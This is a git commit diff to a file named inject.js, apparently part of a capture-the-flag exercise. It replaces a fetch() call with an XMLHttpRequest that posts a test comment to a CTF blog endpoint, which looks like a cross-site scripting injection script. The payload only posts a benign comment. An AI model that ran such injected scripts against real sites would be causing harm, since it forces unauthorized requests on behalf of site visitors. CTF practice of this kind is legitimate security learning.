9671aab8fdbfda01e711edeb8d48f2e10d27abe9
Panagiotis Vasilikos <94691274+panagiotisvasilikos@users.noreply.github.com>
2023-05-05 01:18:17 +0200

    Update inject.js

--- inject.js
+++ inject.js
@@ -1,9 +1,13 @@
-fetch('http://blog.99014fee-590.ctf.one.dr.punksecurity.cloud:5000/new-comment', {method: 'POST', body:"name=panvaxss&comment=helloworld2112"}); 
-const response = await fetch("http://blog.99014fee-590.ctf.one.dr.punksecurity.cloud:5000/new-comment", {
-method: 'POST',
-body: 'name=panvaxss&comment=helloworld',
-});
+let xhr = new XMLHttpRequest();
+xhr.open("POST", "http://blog.99014fee-590.ctf.one.dr.punksecurity.cloud:5000/new-comment");
 
-response.json().then(data => {
-  console.log(data);
-});
+
+xhr.onreadystatechange = function () {
+  if (xhr.readyState === 4) {
+    console.log(xhr.status);
+    console.log(xhr.responseText);
+  }};
+
+let data = "name=panvaxss&comment=helloworld2112";
+
+xhr.send(data);
